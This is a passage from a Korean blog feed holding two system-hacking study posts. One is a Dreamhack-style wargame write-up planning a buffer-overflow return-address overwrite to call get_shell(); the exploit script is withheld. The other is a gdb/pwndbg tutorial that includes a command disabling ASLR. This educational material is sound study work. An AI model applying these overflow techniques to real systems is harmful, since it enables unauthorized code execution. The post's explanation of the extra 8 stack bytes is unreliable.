        &lt;li&gt;buf[0x28]에 넣는 것으로 설정되어 있고, 입력값이 범위를 넘어가는 것을 차단하지 않는다.&lt;/li&gt;
        &lt;li&gt;따라서 BOF(Buffer OverFlow) 공격을 수행하는 것으로 결정한다.&lt;/li&gt;
      &lt;/ol&gt;
    &lt;/li&gt;
    &lt;li&gt;유저가 입력값을 입력할 때 스택의 구조를 알아내어 현재 스택 프레임이 종료된 후 실행될 인스트럭션의 주소를 오염시킨다.&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;각 페이즈의 목적을 차근차근 달성해 보자.&lt;/p&gt;

&lt;h3 id=&quot;get_shell-함수의-시작-주소-알아내기&quot;&gt;get_shell() 함수의 시작 주소 알아내기&lt;/h3&gt;

&lt;p&gt;특정 프로그램을 구성하는 함수들은 프로세스가 메모리에 올라갈 때 한꺼번에 코드 세그먼트에 로딩된다. c 언어의 경우 위에서부터 아래로 컴파일되기 때문에, 함수가 코드 세그먼트에 로딩되는 순서는 코드가 쓰인 순서와 일치하게 된다. 즉, get_shell() 함수 다음에 main() 함수가 코드 세그먼트에 로딩된다.&lt;/p&gt;

&lt;p&gt;이제 gdb를 이용해 get_shell() 함수의 위치를 알아내 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;딱히 난독화하지 않았기 때문에 심볼이 그대로 살아 있다. 브레이크 포인트를 get_shell에 걺으로써 get_shell의 주소를 알아낼 수 있었다.&lt;/p&gt;

&lt;p&gt;추가적으로, main() 함수의 주소는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;코드상에서 get_shell보다 아래에 main이 쓰여 있었기 때문에 메모리의 코드 영역에도 main이 get_shell보다 뒤에 로딩된 것을 확인할 수 있다.&lt;/p&gt;

&lt;h3 id=&quot;유저-입력값을-받을-당시-스택의-구조-확인하기&quot;&gt;유저 입력값을 받을 당시 스택의 구조 확인하기&lt;/h3&gt;

&lt;p&gt;위에서 짚어본 것처럼, 새롭게 콜된 함수의 스택 프레임과 이전 함수의 스택 프레임 간의 관계는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;스택에는 로컬 변수가 저장되기 때문에 우리가 BOF의 매개로 사용하는 buf[0x28] 변수 또한 스택에 있을 것을 예상하고 있다. 또한 변수는 선언된 순서대로 스택에 들어가므로 buf 변수는 main 함수의 rbp에 위치해 있을  것이다. 따라서 우리가 익스플로잇할 당시의 스택의 구조는 아래와 같다.&lt;/p&gt;

&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp-0x1]~[rbp-0x28]&lt;/strong&gt;: buf[0x28]&lt;/p&gt;

&lt;p&gt;================main() 스택 프레임 끝====================&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp+0x7]~[rbp]&lt;/strong&gt;: start_main()의 rbp 주소(0x0000000000000000)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp+0x0e]~[rbp+0x07]&lt;/strong&gt;: main()이 끝난 후 이어서 실행될 인스트럭션 주소&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;

&lt;p&gt;과연 추측이 맞는지 gdb를 붙여서 확인해 보자.&lt;/p&gt;

&lt;h3 id=&quot;실제-스택의-구조를-디버거로-확인하기&quot;&gt;실제 스택의 구조를 디버거로 확인하기&lt;/h3&gt;

&lt;p&gt;주어진 함수를 gcc로 컴파일할 때 스택 카나리를 끄고(-fno-stack-protector) PIE를 끔으로써 ASLR도 적용되지 않도록(-no-pie) 해두었기 때문에 아마 스택의 구조는 비교적 간단할 것이다. 목표 프로세스인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rao&lt;/code&gt; 에 gdb를 붙여서 사용자 입력값을 받고 저장하는 시점의 스택의 구조를 해당 시점에서의 rbp까지 포함되도록 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;흰색으로 하이라이트한 부분, 즉 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf80&lt;/code&gt; 이 rbp이며, 스택의 구조 자체는 예상했던 바와 일치함을 확인할 수 있었다. 그러나, 딱 한 가지 다른 부분이 있었다.&lt;/p&gt;

&lt;p&gt;buf[0x28] 변수는 애초에 0x28 byte 만큼의 크기를 가지기 때문에 예상대로라면 buf[0x28]이 차지하는 주소는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf7e&lt;/code&gt; ~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf58&lt;/code&gt; 이었어야 하지만, 실제로 확인한 결과는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf7e&lt;/code&gt; ~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf50&lt;/code&gt; 이었다. 즉 8byte 만큼이 더 할당되어 있었다. buf[0x28] 이 실제로는 buf[0x30] 이었던 것이다.&lt;/p&gt;

&lt;p&gt;이 이유가 궁금해 알아보니, 스택 보호의 일환으로 c 컴파일러가 char 배열을 할당할 때 8byte 정도를 더 할당해 준다는 사실을 알 수 있었다. 단순히 이론상으로만 문제에 접근할 게 아니라 실제로 구동하는 상황에서의 메모리 구조를 확인한 이후 익스플로잇을 작성하는 게 좋겠다는 교훈을 얻을 수 있었다.&lt;/p&gt;

&lt;h3 id=&quot;익스플로잇-작성하기&quot;&gt;익스플로잇 작성하기&lt;/h3&gt;

&lt;p&gt;익스플로잇에서 프로세스에게 보낼 페이로드를 먼저 구상해 보자. 프로세스가 구동중일 때 실제 스택의 구조는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp-0x1]~[rbp-0x30]&lt;/strong&gt;: buf[0x28]                                                              //0x30 byte&lt;/p&gt;

&lt;p&gt;================main() 스택 프레임 끝====================&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp+0x7]~[rbp]&lt;/strong&gt;: start_main()의 rbp 주소(0x0000000000000000)      //0x08 byte&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp+0x0e]~[rbp+0x07]&lt;/strong&gt;: main()이 끝난 후 이어서 실행될 인스트럭션 주소  //0x08 byte&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;

&lt;p&gt;따라서 우리는 총 0x38 byte를 더미값으로 채운 후, 마지막 0x08 byte에 실행되길 원하는 get_shell() 함수의 시작 주소를 붙인 페이로드를 만들면 된다.&lt;/p&gt;

&lt;p&gt;이렇게 생성한 페이로드를 정상적으로 프로세스에 입력해줄 수 있는 python 스크립트를 만들어 실행하면 셸이 실행될 것이다. 여기에 해당 스크립트를 적고 자세한 분석 내용을 쓸까 고민했지만, 그렇게 하면 스포일러가 될지도 모르겠다는 생각이 들어 생략한다.&lt;/p&gt;

&lt;p&gt;다만, 우리가 이제까지 배운 pwn 라이브러리 상에서 문제를 해결할 수 있으며, 어떤 메소드가 어떤 형식의 값을 받아 어떤 형식의 값을 리턴하는지, 그리고 셸을 땄음을 어떻게 확인할 수 있을지를 생각하고 스크립트를 작성하는 것을 추천한다.&lt;/p&gt;
</description>
        <pubDate>Fri, 15 Jul 2022 04:25:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/step3-2</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/step3-2</guid>
      </item>
    
      <item>
        <title>System Hackig Step 3-1</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#stage-3-1&quot; id=&quot;markdown-toc-stage-3-1&quot;&gt;STAGE 3-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#gdb-사용하기-기초&quot; id=&quot;markdown-toc-gdb-사용하기-기초&quot;&gt;gdb 사용하기 기초&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#tldr&quot; id=&quot;markdown-toc-tldr&quot;&gt;TL;DR&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#prolog&quot; id=&quot;markdown-toc-prolog&quot;&gt;Prolog&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#context-pwndbg의-대시보드&quot; id=&quot;markdown-toc-context-pwndbg의-대시보드&quot;&gt;Context: pwndbg의 대시보드&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#breakcontinue&quot; id=&quot;markdown-toc-breakcontinue&quot;&gt;break&amp;amp;continue&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#run&quot; id=&quot;markdown-toc-run&quot;&gt;run&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disassembly&quot; id=&quot;markdown-toc-disassembly&quot;&gt;disassembly&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#navigate-ni-si-finish&quot; id=&quot;markdown-toc-navigate-ni-si-finish&quot;&gt;navigate: ni, si, finish&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#examine-x&quot; id=&quot;markdown-toc-examine-x&quot;&gt;examine: x&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#telescope&quot; id=&quot;markdown-toc-telescope&quot;&gt;telescope&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vmmap&quot; id=&quot;markdown-toc-vmmap&quot;&gt;vmmap&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#gdbpython&quot; id=&quot;markdown-toc-gdbpython&quot;&gt;gdb/python&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#그-외-자주-사용되는-명령어들과-그-단축키&quot; id=&quot;markdown-toc-그-외-자주-사용되는-명령어들과-그-단축키&quot;&gt;그 외 자주 사용되는 명령어들과, 그 단축키&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;stage-3-1&quot;&gt;STAGE 3-1&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;gdb 설치와 pwndbg 플러그인 설치하기.&lt;/li&gt;
  &lt;li&gt;만일 뭔가 잘못해서 aslr 커맨드의 화이트리스트로~ 라는 경고문이 나온다면, 그건 여러 gdb 플러그인을 설치했기 때문에 .gdbinit 파일이 중복돼서 생기는 문제이므로 ~/.gdbinit 파일을 깨끗하게 지우고 설치했던 플러그인 폴더들을 다 지운 후 gdb가 여전히 남아 있는지 확인 한 번 해보고 다시 플러그인을 설치하는 것을 추천한다. 설치할 때의 instruction을 잘 따르자.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;gdb-사용하기-기초&quot;&gt;gdb 사용하기 기초&lt;/h1&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;gdb는 리눅스의 대표적인 디버거&lt;/li&gt;
  &lt;li&gt;무료로 설치할 수 있고, 수많은 유용한 플러그인을 결합해 사용할 수 있음.&lt;/li&gt;
  &lt;li&gt;다양한 명령어가 존재하며, 적재적소에 명령어를 사용할 때 그 진가를 발휘할 수 있음.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;prolog&quot;&gt;Prolog&lt;/h2&gt;

&lt;p&gt;리눅스의 실행파일은 .elf이다. 이런 elf 파일의 정보를 읽어오기 위해 리눅스에서 기본으로 제공하고 있는 명령어가 있는데, 그것은 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf&lt;/code&gt; 이다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf -h {file path}&lt;/code&gt; 를 실행해 대상 실행 파일의 헤더 정보를 읽어온 결과는 아래와 같이 표시된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled.jpeg&quot; alt=&quot;readelf로 elf 파일의 헤더 정보를 읽어온 결과&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;readelf로 elf 파일의 헤더 정보를 읽어온 결과&lt;/p&gt;

&lt;p&gt;이를 이용해 대상 파일의 EP, 즉 entry point를 알 수 있다. &lt;strong&gt;리버싱할 때 제일 중요한 게 바로 이 EP를 찾는 것&lt;/strong&gt;인데, 리눅스 환경에서 ELF 파일은 손쉽게 EP를 알 수 있으므로 스타트는 쉽게 끊을 수 있다.&lt;/p&gt;

&lt;p&gt;다만 ASLR 이라고 리눅스 자체 메모리 보호 기법이 있는데, 힙이나 스택 등 어떤 프로세스를 실행할 때마다 그 프로세스에게 할당되는 가상 메모리의 주소가 전부 달라지는 기능이 있다. ASLR이 설정되어 있다면 디버깅할 때마다 모든 주소가 달라지는 진기명기를 확인할 수 있으니, ASLR을 꺼두는 것을 추천한다.&lt;/p&gt;

&lt;p&gt;ASLR이 함수의 EP에도 영향을 주는지는 내가 방금 ASLR을 끄고 디버깅해서 확인했다. 진짜로 끄는 것을 강력 추천한다.&lt;/p&gt;

&lt;p&gt;ASLR을 해제하기 위해서는 아래의 명령어를 터미널에 입력하면 된다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo sysctl -w kernel.randomize_va_space=0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;해당 elf 파일의 헤더 정보를 알아냈다면, 드디어 gdb를 이용해 실행 파일을 분석해 볼 시간이다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb {file_path}&lt;/code&gt; 를 실행해 gdb를 해당 파일에 붙인다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;start&lt;/code&gt; 명령어를 입력한다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%201.jpeg&quot; alt=&quot;start 명령어를 실행한 결과.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;start 명령어를 실행한 결과.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;gdb의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;start&lt;/code&gt; 명령어는 EP부터 프로그램을 분석할 수 있게 해준다.&lt;/li&gt;
      &lt;li&gt;현재 rip의 값은 DISASM 섹션의 화살표가 가리키고 있는 주소이다.
        &lt;ul&gt;
          &lt;li&gt;이 경우 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x555555555149&lt;/code&gt; 임을 확인할 수 있다.&lt;/li&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1149&lt;/code&gt; 에 BP가 걸린 걸 보니 이 프로세스의 EP는 오프셋 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1149&lt;/code&gt; 일 것이다.&lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;아니 앞에서는 EP 주소가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1060&lt;/code&gt; 인데 왜 main의 엔트리는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1149&lt;/code&gt; 인 거야???&lt;/p&gt;

            &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%202.jpeg&quot; alt=&quot;이해가 안 돼서 main의 엔트리와 원래 엔트리로 예상되는 주소의 데이터를 체크해 보았다.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

            &lt;p&gt;이해가 안 돼서 main의 엔트리와 원래 엔트리로 예상되는 주소의 데이터를 체크해 보았다.&lt;/p&gt;

            &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt; 함수는 컴파일할 때 자동으로 따라와 붙는 함수인데, 해당 함수의 끝 부분에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__libc_start_main&lt;/code&gt; 이라는 dll을 호출한다. 해당 dll에서 연쇄적인 호출 과정을 거쳐서 내가 만든 프로세스의 진짜 엔트리인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; 이 호출되기 때문이 이와 같은 불일치 현상이 일어나는 것이다.&lt;/p&gt;

            &lt;p&gt;한 마디로 elf 파일의 엔트리는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt; 함수부터라고 인식하지만, gdb를 붙여서 돌렸을 때 gdb는 쓸데없는 dll 실행은 넘겨 버리고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; 에 BP를 만들기 때문에 발생하는 현상이다. &lt;del&gt;gdb가 너무 똑똑해서 생긴 문제였다…!&lt;/del&gt;&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;context-pwndbg의-대시보드&quot;&gt;Context: pwndbg의 대시보드&lt;/h2&gt;

&lt;p&gt;사실 Context라는 말은 프로세스 관련해서 많이 쓰이는 말이다. pwndbg는 이런 context의 특성을 차용해 &lt;strong&gt;프로세스 실행 시 주요 메모리들의 실시간 상태를 보여주는&lt;/strong&gt; 자신의 대시보드를 &lt;strong&gt;Context&lt;/strong&gt;라고 칭하고 있다.&lt;/p&gt;

&lt;p&gt;pwndbg의 context는 크게 4개의 영역으로 구분된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Registers: 레지스터의 상태를 보여준다. 레지스터의 종류가 뭐였지? 라는 의문이 든다면 &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step2/#/&quot;&gt;System Hacking Step2: Computer Architecture&lt;/a&gt; 참고.&lt;/li&gt;
  &lt;li&gt;Disasm: rip부터 시작해서 여러 줄에 걸쳐 디스어셈블된 결과를 보여주는 섹션이다. 즉, 앞으로 실행될 인스트럭션들을 어셈블리어로 보여주는 섹션이다.&lt;/li&gt;
  &lt;li&gt;Stack: rsp부터 여러 줄에 걸쳐 스택의 값들을 보여준다. 스택의 맨 위부터 뭐가 있는지(스택에 뭐가 들어있는지 가장 최신의 것부터)를 어느 정도 보여준다는 뜻이다.&lt;/li&gt;
  &lt;li&gt;Backtrace: 현재 rip에 도달할 때까지 어떤 함수들이 중첩되어 호출됐는지 보여준다. 화살표가 있는 부분이 현재 rip가 있는 함수이고, 그 밑에 있는 것들이 이제까지 호출됐던 함수 목록이다. 보통 이러면 콜스택 보여주지 않나? 왜 굳이 이미 지나가서 기능이 끝난 함수들을 보여주려 하지?&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;breakcontinue&quot;&gt;break&amp;amp;continue&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;gdb를 이용해 프로그램을 분석할 땐, 프로그램의 동작 중 아주 일부분에만 관심이 있을 때이다.&lt;/li&gt;
  &lt;li&gt;이러한 목적 달성을 위해 break와 continue라는 기능이 있다.
    &lt;ul&gt;
      &lt;li&gt;break: 특정 주소에 중단점(breakpoint)를 설정하는 기능&lt;/li&gt;
      &lt;li&gt;continue: 현재 지점에서 다음 중단점까지 멈춤 없이 실행하는 기능&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;run&quot;&gt;run&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;프로그램을 단순히 실행만 시키는 명령어.&lt;/li&gt;
  &lt;li&gt;중단점에서 멈추지만, &lt;strong&gt;프로그램을 처음부터 시작한다-중단점이 있으면 멈춘다&lt;/strong&gt;의 시퀀스이므로 &lt;strong&gt;중단점에서 시작한다-다음 중단점에서 멈춘다&lt;/strong&gt;의 시퀀스를 가진 &lt;strong&gt;continue와는 확연한 차이점&lt;/strong&gt;이 있다.&lt;/li&gt;
&lt;/ul&gt;

&lt;aside&gt;
⚙ gdb는 명령어 줄여쓰기 기능을 제공하기 때문에, 명령어를 특정할 수 있는 최소한의 문자열만 입력하면 자동으로 명령어를 찾아서 수행해 준다. 예를 들어서, 앞서 설명한 break는 b만 쳐도 되고, continue의 경우에는 c만 쳐도 된다. run 또한 r만 쳐도 자동으로 실행된다.

&lt;/aside&gt;

&lt;h2 id=&quot;disassembly&quot;&gt;disassembly&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;gdb에서 기본으로 제공하는 디스어셈블 명령어.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;함수 이름을 인자로 전달하면 해당 함수가 리턴될 때까지 전부 디스어셈블해 보여준다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;pwndbg에서는 &lt;strong&gt;u, nearpc, pdisassemble&lt;/strong&gt;을 제공한다. 디스어셈블된 코드를 가독성 좋게 출력해준다는 점에서 쓸 만하다!&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%205.jpeg&quot; alt=&quot;확실히 낫다.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;확실히 낫다.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;navigate-ni-si-finish&quot;&gt;navigate: ni, si, finish&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;명령어를 한 줄씩 자세히 분석하는 기능.
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;ni(next instruction)&lt;/strong&gt;: 어셈블리 명령어를 딱 한 줄 실행한다. &lt;strong&gt;서브루틴의 내부로 들어가지 않는다.&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;si(step into)&lt;/strong&gt;: 어셈블리 명령어를 딱 한 줄 실행한다. &lt;strong&gt;서브루틴의 내부로 들어간다.&lt;/strong&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;strong&gt;finish&lt;/strong&gt;: 함수 규모가 너무 커서 ni로는 도무지 원래 함수로 돌아올 수 없는 경우, 현재 위치한 함수의 맨 끝까지 한번에 실행할 수 있는 명령어.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;서브루틴이란?
    &lt;ul&gt;
      &lt;li&gt;함수 내부에서 다른 함수를 콜할 때, 그 다른 함수의 실행 루틴을 서브루틴이라고 한다.&lt;/li&gt;
      &lt;li&gt;즉 서브루틴의 내부=현재 함수에서 콜한 다른 함수의 내부&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;examine-x&quot;&gt;examine: x&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;가상 메모리에 존재하는 임의 주소의 값을 관찰해야 할 때 사용한다.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;x&lt;/strong&gt;: &lt;strong&gt;원하는 주소&lt;/strong&gt;에서, &lt;strong&gt;원하는 길이&lt;/strong&gt;만큼의 데이터를 &lt;strong&gt;원하는 형식으로 인코딩&lt;/strong&gt;해 확인할 수 있다.
    &lt;ul&gt;
      &lt;li&gt;형식: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/{원하는 데이터 묶음 수}{한 데이터 묶음의 길이}{데이터 형식}  {메모리 주소}&lt;/code&gt;
        &lt;ul&gt;
          &lt;li&gt;한 데이터 묶음의 길이(size): b(byte), h(halfword), w(word), g(giant; 8 bytes)&lt;/li&gt;
          &lt;li&gt;데이터의 형식(format): o(octal), x(hex), d(decimal), u(unsigned decimal), t(binary), f(float), a(address), i(instruction), c(char), s(string), z(hex, zero padded on the left)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;telescope&quot;&gt;telescope&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;pwndbg가 제공하는 메모리 덤프 기능. 메모리가 참조하고 있는 주소를 재귀적으로 탐색해 값을 보여주기까지 함!&lt;/li&gt;
  &lt;li&gt;현재 보이는 이 값이 어떤 주소에서 어떻게 사용되는지까지 알 수 있으므로 굉장히 유용하다.
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;rsp 기준으로 8개의 메모리 주소를 보여주기 때문에 콜스택의 역사를 알 수 있다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;vmmap&quot;&gt;vmmap&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;가상 메모리의 레이아웃을 보여주며, 어떤 파일이 매핑된 영역일 때 해당 파일의 경로까지 보여줌.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;cat /proc/{pid}/maps와 동일한 일을 한다. 물론 가독성은 훨씬 좋다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;aside&gt;
⚙ 파일 매핑:

- 어떤 파일을 메모리에 적재하는 것.
- 리눅스에서 ELF를 실행할 때의 과정:
    1. ELF 자체의 코드, 데이터 등을 가상 메모리에 매핑 
    2. 해당 ELF에 링크된 공유 오브젝트(.so)를 추가로 메모리에 매핑
        - 리눅스의 so = 윈도우의 dll
    3. so에 구현된 함수를 호출할 땐 매핑된 메모리에 존재하는 함수를 대신 호출(메모리에 적재된 so 내부의 함수를 호출)
&lt;/aside&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;gdbpython&quot;&gt;gdb/python&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;gdb를 이용해 디버깅 시, 숫자/알파벳 이외의 값은 입력값으로 직접 입력해줄 수 없는 문제가 있다.&lt;/li&gt;
  &lt;li&gt;첫번째 방식: python argv
    &lt;ul&gt;
      &lt;li&gt;목표 프로그램에 gdb를 붙이고 r 명령어의 인자로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$({원하는 내용을 줄 수 있는 파이썬 코드})&lt;/code&gt; 를 입력하면 프로그램의 &lt;strong&gt;‘인자’&lt;/strong&gt;를 전달할 수 있다.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;사용예:&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;두번째 방식: python input
    &lt;ul&gt;
      &lt;li&gt;목표 프로그램에 gdb를 붙이고, r 명령어의 인자로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&amp;lt;&amp;lt; $({파이썬 코드})&lt;/code&gt; 를 입력하면 프로그램 실행 중에 받는 &lt;strong&gt;‘입력값’&lt;/strong&gt;을 미리 전달할 수 있다.&lt;/li&gt;
